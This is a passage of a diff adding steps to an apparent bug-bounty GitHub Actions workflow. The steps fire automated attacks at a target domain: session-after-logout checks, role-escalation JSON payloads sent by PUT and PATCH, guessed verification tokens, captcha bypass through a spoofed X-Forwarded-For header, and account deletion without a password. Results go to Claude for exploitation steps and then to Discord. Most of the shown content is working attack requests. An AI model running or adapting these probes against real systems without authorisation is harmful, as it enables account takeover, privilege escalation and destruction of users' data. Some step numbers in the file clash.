+            RESP=$(curl -sk -I "$URL" --max-time 8 2>/dev/null)
+            COOKIES=$(echo "$RESP" | grep -i "set-cookie")
+
+            if [ -n "$COOKIES" ]; then
+              # Check HttpOnly
+              echo "$COOKIES" | grep -qi "httponly" || \
+                echo "[NO HTTPONLY] $URL | $COOKIES" \
+                >> /tmp/ultra/$D/session/findings.txt
+
+              # Check Secure flag
+              echo "$COOKIES" | grep -qi "secure" || \
+                echo "[NO SECURE FLAG] $URL | $COOKIES" \
+                >> /tmp/ultra/$D/session/findings.txt
+
+              # Check SameSite
+              echo "$COOKIES" | grep -qi "samesite" || \
+                echo "[NO SAMESITE] $URL | $COOKIES" \
+                >> /tmp/ultra/$D/session/findings.txt
+
+              # Check short cookie values (weak/predictable)
+              COOKIE_VAL=$(echo "$COOKIES" | grep -oE "=[^;]+" | head -1 | cut -c2-)
+              LEN=${#COOKIE_VAL}
+              [ "$LEN" -lt 20 ] && [ "$LEN" -gt 0 ] && \
+                echo "[WEAK SESSION TOKEN] $URL | length=$LEN value=$COOKIE_VAL" \
+                >> /tmp/ultra/$D/session/findings.txt
+
+              # Session token in URL parameters
+              echo "$URL" | grep -qE "[?&](session|token|auth|sid|JSESSIONID)=" && \
+                echo "[TOKEN IN URL] $URL" >> /tmp/ultra/$D/session/findings.txt
+            fi
+          done
+
+          # ── Session after logout test ──────────────────────────
+          LOGOUT_EP=$(grep -iE "(logout|signout|sign.out)" \
+            /tmp/ultra/$D/auth/auth_urls.txt 2>/dev/null | head -1)
+
+          if [ -n "$LOGOUT_EP" ]; then
+            # Get a session cookie first (if any protected endpoint responds)
+            PROTECTED=$(head -5 /tmp/ultra/$D/auth/auth_urls.txt 2>/dev/null | \
+              grep -v logout | head -1)
+
+            if [ -n "$PROTECTED" ]; then
+              # Simulate: get cookie → logout → try with old cookie
+              OLD_COOKIE=$(curl -sk -c /tmp/session_jar.txt "$PROTECTED" \
+                --max-time 8 -D - 2>/dev/null | \
+                grep -i "set-cookie" | head -1)
+
+              if [ -n "$OLD_COOKIE" ]; then
+                # Logout
+                curl -sk -X POST "$LOGOUT_EP" \
+                  -b /tmp/session_jar.txt \
+                  --max-time 8 -o /dev/null 2>/dev/null || true
+
+                # Try accessing with old session
+                S=$(curl -sk -b /tmp/session_jar.txt \
+                  -o /dev/null -w "%{http_code}" \
+                  "$PROTECTED" --max-time 8 2>/dev/null)
+
+                echo "200 201" | grep -qw "$S" && \
+                  echo "[SESSION AFTER LOGOUT!] $PROTECTED still returns $S after logout" \
+                  >> /tmp/ultra/$D/session/findings.txt
+              fi
+            fi
+          fi
+
+          # ── JWT algorithm confusion (RS256→HS256) ─────────────
+          export DOMAIN="$D"
+          python3 /tmp/jwt_check.py 2>/dev/null || true
+
+          # ── Predictable session token patterns ─────────────────
+          head -10 /tmp/ultra/$D/urls/live_urls.txt | while read URL; do
+            # Collect multiple session tokens and compare
+            T1=$(curl -sk -I "$URL" --max-time 5 2>/dev/null | \
+              grep -i "set-cookie" | grep -oE "=[A-Za-z0-9+/=]{8,}" | head -1)
+            T2=$(curl -sk -I "$URL" --max-time 5 2>/dev/null | \
+              grep -i "set-cookie" | grep -oE "=[A-Za-z0-9+/=]{8,}" | head -1)
+
+            if [ -n "$T1" ] && [ -n "$T2" ] && [ "$T1" = "$T2" ]; then
+              echo "[STATIC SESSION TOKEN!] $URL | Same token across requests" \
+                >> /tmp/ultra/$D/session/findings.txt
+            fi
+          done
+
+          echo "SESSION_COUNT=$(wc -l < /tmp/ultra/$D/session/findings.txt)" >> $GITHUB_ENV
+
+      # ════════════════════════════════════════════════════════════
+      # STEP 25 — Privilege Escalation + Email Verification + Misc
+      # From General checklist section
+      # ════════════════════════════════════════════════════════════
+      - name: "2️⃣5️⃣ Privilege Escalation + Verification Bypass"
+        run: |
+          D=${{ env.DOMAIN }}
+          mkdir -p /tmp/ultra/$D/privesc
+          > /tmp/ultra/$D/privesc/findings.txt
+
+          # ── Role/privilege parameter escalation ────────────────
+          PROFILE_EPS=$(grep -iE "(profile|account|settings|user|me)" \
+            /tmp/ultra/$D/auth/auth_urls.txt 2>/dev/null | head -10)
+
+          for EP in $PROFILE_EPS; do
+            # Add role escalation params
+            for PAYLOAD in \
+              '{"role":"admin","isAdmin":true,"admin":true}' \
+              '{"role_id":1,"role":"administrator"}' \
+              '{"user_type":"admin","plan":"enterprise"}' \
+              '{"is_superuser":true,"is_staff":true}' \
+              '{"privilege":"high","level":99}'; do
+              S=$(curl -sk -X PUT "$EP" \
+                -H "Content-Type: application/json" \
+                -d "$PAYLOAD" \
+                -o /tmp/priv_resp.json \
+                -w "%{http_code}" --max-time 8 2>/dev/null)
+              if echo "200 201 204" | grep -qw "$S"; then
+                REFLECTED=$(python3 -c "
+import json,sys
+try:
+  d=json.load(open('/tmp/priv_resp.json'))
+  found=[k for k in ['role','isAdmin','admin','privilege','plan','is_superuser'] if k in str(d)]
+  print(','.join(found))
+except: print('')
+" 2>/dev/null)
+                [ -n "$REFLECTED" ] && \
+                  echo "[PRIVESC?] $EP | Reflected: $REFLECTED | $PAYLOAD" \
+                  >> /tmp/ultra/$D/privesc/findings.txt
+              fi
+            done
+
+            # PATCH request (often less protected)
+            for PAYLOAD in '{"role":"admin"}' '{"isAdmin":true}'; do
+              S=$(curl -sk -X PATCH "$EP" \
+                -H "Content-Type: application/json" \
+                -d "$PAYLOAD" \
+                -o /dev/null -w "%{http_code}" --max-time 8 2>/dev/null)
+              echo "200 201 204" | grep -qw "$S" && \
+                echo "[PATCH PRIVESC?] $EP | $PAYLOAD -> $S" \
+                >> /tmp/ultra/$D/privesc/findings.txt
+            done
+          done
+
+          # ── Email verification bypass ──────────────────────────
+          VERIFY_EPS=$(grep -iE "(verify|email.confirm|activate|validation)" \
+            /tmp/ultra/$D/auth/auth_urls.txt 2>/dev/null | head -8)
+
+          for EP in $VERIFY_EPS; do
+            # Direct access without token
+            S=$(curl -sk -o /dev/null -w "%{http_code}" "$EP" --max-time 8)
+            echo "200 302" | grep -qw "$S" && \
+              echo "[VERIFY NO TOKEN?] $EP -> $S" \
+              >> /tmp/ultra/$D/privesc/findings.txt
+
+            # Response manipulation indicators
+            RESP=$(curl -sk -X POST "$EP" \
+              -d "token=invalid_token_test" \
+              --max-time 8 2>/dev/null | head -c 500)
+            if echo "$RESP" | grep -qiE "is_verified|email_verified|confirmed"; then
+              echo "[VERIFY REFLECTED FIELD] $EP | Field present in response — test manipulation" \
+                >> /tmp/ultra/$D/privesc/findings.txt
+            fi
+
+            # Predictable token
+            for TOKEN in "1" "0" "true" "null" "test" "000000" "123456"; do
+              S=$(curl -sk -o /dev/null -w "%{http_code}" \
+                "${EP}?token=$TOKEN" --max-time 8)
+              echo "200 302" | grep -qw "$S" && \
+                echo "[VERIFY WEAK TOKEN?] ${EP}?token=$TOKEN -> $S" \
+                >> /tmp/ultra/$D/privesc/findings.txt
+            done
+          done
+
+          # ── Captcha bypass patterns ────────────────────────────
+          CAP_EPS=$(grep -iE "(captcha|recaptcha|hcaptcha)" \
+            /tmp/ultra/$D/urls/all_urls.txt 2>/dev/null | head -5)
+
+          for EP in $CAP_EPS; do
+            # Without captcha param
+            S=$(curl -sk -X POST "$EP" \
+              -d "username=test&password=test" \
+              -o /dev/null -w "%{http_code}" --max-time 8 2>/dev/null)
+            echo "200 201 302" | grep -qw "$S" && \
+              echo "[CAPTCHA BYPASS?] $EP | No captcha param -> $S" \
+              >> /tmp/ultra/$D/privesc/findings.txt
+
+            # With internal IP header
+            S=$(curl -sk -X POST "$EP" \
+              -H "X-Forwarded-For: 127.0.0.1" \
+              -d "username=test&password=test&g-recaptcha-response=skip" \
+              -o /dev/null -w "%{http_code}" --max-time 8 2>/dev/null)
+            echo "200 201 302" | grep -qw "$S" && \
+              echo "[CAPTCHA+IP BYPASS?] $EP | X-FF: 127.0.0.1 -> $S" \
+              >> /tmp/ultra/$D/privesc/findings.txt
+          done
+
+          # ── Account deletion without password ─────────────────
+          DEL_EPS=$(grep -iE "(delete.account|account/delete|user/delete|close.account)" \
+            /tmp/ultra/$D/auth/auth_urls.txt 2>/dev/null | head -5)
+
+          for EP in $DEL_EPS; do
+            # Try without password field
+            S=$(curl -sk -X DELETE "$EP" \
+              -H "Content-Type: application/json" \
+              -d '{"confirm":true}' \
+              -o /dev/null -w "%{http_code}" --max-time 8 2>/dev/null)
+            echo "200 201 204" | grep -qw "$S" && \
+              echo "[DELETE WITHOUT PASS?] $EP -> $S" \
+              >> /tmp/ultra/$D/privesc/findings.txt
+          done
+
+          echo "PRIVESC_COUNT=$(wc -l < /tmp/ultra/$D/privesc/findings.txt)" >> $GITHUB_ENV
+
+
+      # STEP 21 — Save All Results
+      # ════════════════════════════════════════════════════════════
+      - name: "💾 Save Results"
+        run: |
+          D=${{ env.DOMAIN }}
+          TS=$(date -u +"%Y-%m-%d_%H-%M")
+          mkdir -p results/$D/ultra-$TS
+
+          declare -A FILES=(
+            ["nuclei/all.json"]="nuclei.json"
+            ["xss/results.txt"]="xss.txt"
+            ["logic/redirects.txt"]="redirects.txt"
+            ["logic/cors.txt"]="cors.txt"
+            ["auth/bypass.txt"]="bypass.txt"
+            ["idor/findings.txt"]="idor.txt"
+            ["blind/ssrf.txt"]="blind_ssrf.txt"
+            ["logic/rate_limit.txt"]="rate_limit.txt"
+            ["auth/enum.txt"]="enumeration.txt"
+            ["race/findings.txt"]="race_condition.txt"
+            ["auth/host_header.txt"]="host_header.txt"
+            ["cache/findings.txt"]="cache_poison.txt"
+            ["ssti/findings.txt"]="ssti.txt"
+            ["jwt/findings.txt"]="jwt.txt"
+            ["graphql/findings.txt"]="graphql.txt"
+            ["mass/findings.txt"]="mass_assign.txt"
+            ["files/findings.txt"]="sensitive_files.txt"
+            ["headers/findings.txt"]="sec_headers.txt"
+            ["logic/bizlogic.txt"]="biz_logic.txt"
+            ["logic/hpp.txt"]="hpp.txt"
+            ["oauth/findings.txt"]="oauth.txt"
+            ["oauth/advanced.txt"]="oauth_advanced.txt"
+            ["twofa/findings.txt"]="twofa_bypass.txt"
+            ["reset/findings.txt"]="reset_advanced.txt"
+            ["session/findings.txt"]="session_audit.txt"
+            ["privesc/findings.txt"]="privesc.txt"
+          )
+
+          for SRC in "${!FILES[@]}"; do
+            DST="${FILES[$SRC]}"
+            cp "/tmp/ultra/$D/$SRC" "results/$D/ultra-$TS/$DST" 2>/dev/null || true
+          done
+
+          git config user.name  "github-actions[bot]"
+          git config user.email "github-actions[bot]@users.noreply.github.com"
+          git add results/
+          git diff --staged --quiet || \
+            git commit -m "ultra: $D [$TS] C:${{ env.NUCLEI_CRITICAL }} H:${{ env.NUCLEI_HIGH }} I:${{ env.IDOR_COUNT }} B:${{ env.BYPASS_COUNT }}"
+          git push || true
+
+      # ════════════════════════════════════════════════════════════
+      # STEP 22 — AI ULTRA TRIAGE (Claude)
+      # Chain detection + bounty estimation + exploitation steps
+      # ════════════════════════════════════════════════════════════
+      - name: "🧠 AI Ultra Triage"
+        run: |
+          D=${{ env.DOMAIN }}
+          > /tmp/ultra/$D/ai_report.txt
+
+          # Build comprehensive summary
+          build_section() {
+            local FILE="$1" TITLE="$2"
+            if [ -s "$FILE" ]; then
+              echo "=== $TITLE ==="; head -8 "$FILE"; echo ""
+            fi
+          }
+
+          SUMMARY="Target: $D
+
+$(build_section /tmp/ultra/$D/nuclei/all.json "Nuclei Findings")
+$(build_section /tmp/ultra/$D/idor/findings.txt "IDOR")
+$(build_section /tmp/ultra/$D/auth/bypass.txt "Auth Bypass")
+$(build_section /tmp/ultra/$D/logic/cors.txt "CORS")
+$(build_section /tmp/ultra/$D/xss/results.txt "XSS")
+$(build_section /tmp/ultra/$D/logic/rate_limit.txt "Rate Limit")
+$(build_section /tmp/ultra/$D/blind/ssrf.txt "Blind SSRF")
+$(build_section /tmp/ultra/$D/race/findings.txt "Race Condition")
+$(build_section /tmp/ultra/$D/auth/host_header.txt "Host Header")
+$(build_section /tmp/ultra/$D/cache/findings.txt "Cache Poison")
+$(build_section /tmp/ultra/$D/ssti/findings.txt "SSTI")
+$(build_section /tmp/ultra/$D/jwt/findings.txt "JWT Issues")
+$(build_section /tmp/ultra/$D/graphql/findings.txt "GraphQL")
+$(build_section /tmp/ultra/$D/mass/findings.txt "Mass Assignment")
+$(build_section /tmp/ultra/$D/files/findings.txt "Sensitive Files")
+$(build_section /tmp/ultra/$D/oauth/findings.txt "OAuth")
+$(build_section /tmp/ultra/$D/logic/bizlogic.txt "Business Logic")
+$(build_section /tmp/ultra/$D/oauth/advanced.txt "OAuth Advanced")
+$(build_section /tmp/ultra/$D/twofa/findings.txt "2FA/OTP Bypass")
+$(build_section /tmp/ultra/$D/reset/findings.txt "Password Reset Advanced")
+$(build_section /tmp/ultra/$D/session/findings.txt "Session Security")
+$(build_section /tmp/ultra/$D/privesc/findings.txt "Privilege Escalation")"
+
+          if [ -z "$(echo $SUMMARY | tr -d '[:space:]' | tr -d '=Target' | tr -d ':')" ]; then
+            echo "لا توجد نتائج كافية للتحليل." > /tmp/ultra/$D/ai_report.txt
+            exit 0
+          fi
+
+          PROMPT="أنت خبير Bug Bounty Hunting متخصص في تحليل نتائج الفحص الأمني.
+
+نتائج الفحص الشامل للدومين $D:
+
+$SUMMARY
+
+المطلوب منك:
+1. 🎯 TOP 5 أهم نتائج مرتبة حسب الأولوية (مع سبب الأهمية)
+2. 🔗 هل ينفع تعمل Attack Chain بين الثغرات؟ (مثل: IDOR + CORS = ATO)
+3. 💣 Impact حقيقي لكل نتيجة مهمة (اكتب كـ business impact)
+4. ⚡ الخطوات الفورية التالية لكل نتيجة
+5. 💰 تقدير Bounty لكل نتيجة (Low/Medium/High/Critical: \$range)
+6. ❌ ما الذي يبدو False Positive ويجب تجاهله؟
+7. 🔍 ما الذي يحتاج فحص يدوي إضافي؟
+
+كن مختصراً جداً ومباشراً. الرد بالعربية."
+
+          AI_RESP=$(curl -s "https://api.anthropic.com/v1/messages" \
+            -H "Content-Type: application/json" \
+            -H "x-api-key: ${{ secrets.ANTHROPIC_API_KEY }}" \
+            -H "anthropic-version: 2023-06-01" \
+            -d "$(jq -n --arg p "$PROMPT" \
+              '{model:"claude-sonnet-4-20250514",max_tokens:1500,
+                system:"خبير Bug Bounty متخصص. ردود مختصرة وعملية وعربية.",
+                messages:[{role:"user",content:$p}]}')" | \
+            python3 -c "
+import sys,json
+try: print(json.load(sys.stdin)['content'][0]['text'])
+except: print('تعذر الاتصال بـ Claude API — تحقق من ANTHROPIC_API_KEY')
+" 2>/dev/null || echo "تعذر التحليل")
+
+          echo "$AI_RESP" > /tmp/ultra/$D/ai_report.txt
+          cp /tmp/ultra/$D/ai_report.txt results/$D/ 2>/dev/null || true
+          git add results/ 2>/dev/null || true
+          git diff --staged --quiet 2>/dev/null || git commit -m "ai: $D" 2>/dev/null || true
+          git push 2>/dev/null || true
+
+      # ════════════════════════════════════════════════════════════
+      # STEP 23 — Discord Summary (all findings in one embed)
+      # ════════════════════════════════════════════════════════════
+      - name: "📢 Discord — Summary"
+        if: always()
+        run: |
+          D=${{ env.DOMAIN }}
+          CRIT=${{ env.NUCLEI_CRITICAL || 0 }}
+          HIGH=${{ env.NUCLEI_HIGH || 0 }}
+          MED=${{ env.NUCLEI_MEDIUM || 0 }}
+
+          COLOR=3066993
+          [ "${{ env.HEADERS_COUNT || 0 }}" -gt 0 ]  && COLOR=5793266
+          [ "${{ env.REDIR_COUNT || 0 }}" -gt 0 ]    && COLOR=16776960
+          [ "$MED" -gt 0 ]                            && COLOR=16753920
+          [ "$HIGH" -gt 0 ]                           && COLOR=16744272
+          [ "${{ env.IDOR_COUNT || 0 }}" -gt 0 ]      && COLOR=15158332
+          [ "${{ env.BYPASS_COUNT || 0 }}" -gt 0 ]    && COLOR=15158332
+          [ "$CRIT" -gt 0 ]                           && COLOR=15158332
+          [ "${{ env.SSTI_COUNT || 0 }}" -gt 0 ]      && COLOR=15158332
+          [ "${{ env.BLIND_COUNT || 0 }}" -gt 0 ]     && COLOR=15158332
+
+          RUN_URL="${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}"
+
+          jq -n \
+            --arg d  "$D" \
+            --arg c  "$CRIT" --arg h "$HIGH" --arg m "$MED" \
+            --arg nt "${{ env.NUCLEI_TOTAL || 0 }}" \
+            --arg i  "${{ env.IDOR_COUNT || 0 }}" \
+            --arg b  "${{ env.BYPASS_COUNT || 0 }}" \
+            --arg x  "${{ env.XSS_COUNT || 0 }}" \
+            --arg co "${{ env.CORS_COUNT || 0 }}" \
+            --arg r  "${{ env.REDIR_COUNT || 0 }}" \
+            --arg ra "${{ env.RATE_COUNT || 0 }}" \
+            --arg bl "${{ env.BLIND_COUNT || 0 }}" \
+            --arg rc "${{ env.RACE_COUNT || 0 }}" \
+            --arg hh "${{ env.HOSTHDR_COUNT || 0 }}" \
+            --arg ca "${{ env.CACHE_COUNT || 0 }}" \
+            --arg st "${{ env.SSTI_COUNT || 0 }}" \
+            --arg jw "${{ env.JWT_COUNT || 0 }}" \
+            --arg gq "${{ env.GQL_COUNT || 0 }}" \
+            --arg ma "${{ env.MASS_COUNT || 0 }}" \
+            --arg fi "${{ env.FILES_COUNT || 0 }}" \
+            --arg oa "${{ env.OAUTH_COUNT || 0 }}" \
+            --arg bz "${{ env.BIZLOGIC_COUNT || 0 }}" \
+            --arg oa2 "${{ env.OAUTH_ADV || 0 }}" \
+            --arg tfa "${{ env.TWOFA_COUNT || 0 }}" \
+            --arg rst "${{ env.RESET_COUNT || 0 }}" \
+            --arg ses "${{ env.SESSION_COUNT || 0 }}" \
+            --arg prv "${{ env.PRIVESC_COUNT || 0 }}" \
+            --arg li "${{ env.LIVE || 0 }}" \
+            --arg u  "${{ env.TOTAL || 0 }}" \
+            --arg run "$RUN_URL" \
+            --argjson color $COLOR \
+            '{
+              username:"💎 ULTRA Hunter",
+              embeds:[{
+                title:("💎 ULTRA Scan: "+$d),
+                color:$color,
+                fields:[
+                  {name:"🌐 Live",value:$li,inline:true},{name:"🔗 URLs",value:$u,inline:true},
+                  {name:"───────",value:"───",inline:false},
+                  {name:"🚨 Critical",value:$c,inline:true},{name:"🔴 High",value:$h,inline:true},{name:"🟠 Medium",value:$m,inline:true},
+                  {name:"🎯 Nuclei",value:$nt,inline:true},
+                  {name:"───────",value:"───",inline:false},
+                  {name:"🆔 IDOR",value:$i,inline:true},{name:"🔓 Bypass",value:$b,inline:true},{name:"💉 XSS",value:$x,inline:true},
+                  {name:"🌐 CORS",value:$co,inline:true},{name:"🔄 Redirect",value:$r,inline:true},{name:"🚦 RateLimit",value:$ra,inline:true},
+                  {name:"👁 BlindSSRF",value:$bl,inline:true},{name:"⚡ Race",value:$rc,inline:true},{name:"🏠 HostHdr",value:$hh,inline:true},
+                  {name:"💾 Cache",value:$ca,inline:true},{name:"🖥 SSTI",value:$st,inline:true},{name:"🎟 JWT",value:$jw,inline:true},
+                  {name:"🕸 GraphQL",value:$gq,inline:true},{name:"📦 MassAssign",value:$ma,inline:true},{name:"📁 SensFiles",value:$fi,inline:true},
+                  {name:"🔑 OAuth",value:$oa,inline:true},{name:"💼 BizLogic",value:$bz,inline:true},
+                  {name:"🔐 OAuth Adv",value:$oa2,inline:true},{name:"🔢 2FA Bypass",value:$tfa,inline:true},{name:"🔄 Reset",value:$rst,inline:true},
+                  {name:"🍪 Session",value:$ses,inline:true},{name:"⬆️ PrivEsc",value:$prv,inline:true},
+                  {name:"📋 Run",value:("[View]("+$run+")"),inline:false}
+                ],
+                footer:{text:"BugBountyCI ULTRA • 20 Test Categories"},
+                timestamp:now|todate
+              }]
+            }' | curl -s -X POST "${{ secrets.DISCORD_WEBHOOK }}" \
+                   -H "Content-Type: application/json" -d @- || true
+
+      # ════════════════════════════════════════════════════════════
+      # STEP 24 — Discord AI Report
+      # ════════════════════════════════════════════════════════════
+      - name: "🧠 Discord — AI Report"
+        if: always()
+        run: |
+          D=${{ env.DOMAIN }}
+          AI=$(cat /tmp/ultra/$D/ai_report.txt 2>/dev/null | head -c 1900 || \
+            echo "تحقق من ANTHROPIC_API_KEY في Secrets")
+          [ -z "$AI" ] && AI="لا يوجد نتائج كافية"
+
+          jq -n \
+            --arg d "$D" --arg ai "$AI" \
+            --arg run "${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}" \
+            '{username:"🧠 AI Triage",embeds:[{
+              title:("✦ AI Ultra Triage: "+$d),
+              color:10181046,
+              description:$ai,
+              fields:[{name:"📋 Run",value:("[View]("+$run+")"),inline:false}],
+              footer:{text:"Claude AI • BugBountyCI ULTRA"},
+              timestamp:now|todate
+            }]}' | curl -s -X POST "${{ secrets.DISCORD_WEBHOOK }}" \
+                   -H "Content-Type: application/json" -d @- || true
+
+      # ════════════════════════════════════════════════════════════
+      # STEP 25 — Discord Per-Vuln (Critical + High only)
+      # ════════════════════════════════════════════════════════════
+      - name: "🚨 Discord — Per-Vuln Alerts"
+        if: always()
+        run: |
+          D=${{ env.DOMAIN }}
+          export DOMAIN="$D"
+          export WEBHOOK="${{ secrets.DISCORD_WEBHOOK }}"
+
+          python3 << 'PYEOF'
+import json, subprocess, time, os
+
+domain  = os.environ["DOMAIN"]
+webhook = os.environ["WEBHOOK"]
+
+try:
+    lines = [l.strip() for l in
+             open(f"/tmp/ultra/{domain}/nuclei/all.json") if l.strip()]
+except:
+    exit(0)
+
+sent = 0
+for line in lines:
+    try:
+        r    = json.loads(line)
+        sev  = r.get("info", {}).get("severity", "")
+        if sev not in ("critical", "high") or sent >= 12:
+            continue
+
+        name  = r.get("info", {}).get("name", "Unknown")[:100]
+        url   = r.get("matched-at", "N/A")[:500]
+        tmpl  = r.get("template-id", "N/A")
+        desc  = (r.get("info", {}).get("description") or "")[:350]
+        cvl   = (r.get("info", {}).get("classification") or {}).get("cve-id") or []
+        cve   = cvl[0] if cvl else "N/A"
+        tags  = ", ".join(r.get("info", {}).get("tags") or [])[:150]
+        ref   = (r.get("info", {}).get("reference") or [""])
+        ref   = ref[0] if ref else ""
+
+        colors = {"critical": 15158332, "high": 16744272}
+        icons  = {"critical": "🚨",    "high": "🔴"}
+
+        payload = json.dumps({
+            "username": "🚨 VulnAlert",
+            "embeds": [{
+                "title": f"{icons[sev]} [{sev.upper()}] {name}",
+                "color": colors[sev],
+                "fields": [
+                    {"name": "🎯 Target",    "value": domain, "inline": True},
+                    {"name": "🔗 URL",       "value": url,    "inline": False},
+                    {"name": "📄 Template",  "value": tmpl,   "inline": True},
+                    {"name": "🛡 CVE",       "value": cve,    "inline": True},
+                    {"name": "🏷 Tags",      "value": tags or "N/A", "inline": True},
+                    {"name": "📝 Description","value": desc or "N/A","inline": False},
+                    {"name": "📚 Reference", "value": ref[:200] or "N/A","inline": False}
+                ],
+                "footer": {"text": "BugBountyCI ULTRA"}
+            }]
+        })
+
+        subprocess.run(
+            ["curl","-s","-X","POST",webhook,
+             "-H","Content-Type: application/json","-d",payload],
+            capture_output=True, timeout=10
+        )
+        sent += 1
+        time.sleep(1.2)
+
+    except Exception as e:
+        print(f"Error: {e}")
+PYEOF
+
+      - name: Upload All Artifacts
+        uses: actions/upload-artifact@v4
+        if: always()
+        with:
+          name: "ultra-${{ env.DOMAIN }}-${{ github.run_number }}"
+          path: /tmp/ultra/
+          retention-days: 90
